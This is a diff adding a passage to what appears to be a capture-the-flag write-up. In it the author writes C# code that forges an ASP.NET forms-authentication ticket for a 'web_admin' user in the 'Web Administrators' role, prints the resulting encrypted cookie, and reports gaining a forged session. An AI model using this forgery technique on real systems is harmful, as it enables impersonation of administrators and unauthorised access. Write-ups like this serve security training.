@@ -633,4 +633,41 @@ givenName: web_admin
 
 This user is part of the `Web Administrators`
 
-Now keeping all the structure the same ill just replace the code in program.cs to 
+Now keeping all the structure the same ill just replace the code in program.cs to forge a session 
+
+```python
+using System;
+using System.Web.Security;
+
+class Program
+{
+    static void Main()
+    {
+        var forgedTicket = new FormsAuthenticationTicket(
+            1,
+            "web_admin",
+            DateTime.Now,
+            DateTime.Now.AddHours(2),
+            true,
+            "Web Administrators"
+        );
+
+        string forgedCookie = FormsAuthentication.Encrypt(forgedTicket);
+        Console.WriteLine("Forged cookie: " + forgedCookie);
+
+        Console.ReadLine();
+    }
+}
+```
+
+This is the code used in program.cs
+
+Ill run this using start again
+
+```python
+Forged cookie: 970E3754D7F736FE33DC8F535CF866E91E252A372CCEA24592840F5FDCCFAE2B4664799B6D20BEA1176F43328094D1B06615E0F3D502744771F1F48D52845C73B4975C526210B2B412CE697FCB1195384EF269A1F6135ECB7CE0165C5B88BA9FDE390B62015688604C3B83CE92A35C1D595C28CB762E1AEB8BCF786496C4343EEA9494F63B84DD092B6F13B7B7F2BC8B09291A109AD3776BCF91B3BF7FBCB7B1412484F9527021D417EBA16090B1D733AF0251CDED4C3869D103BC121A9F0FCB
+```
+
+I now have a forged session
+
+And after replacing my old ``
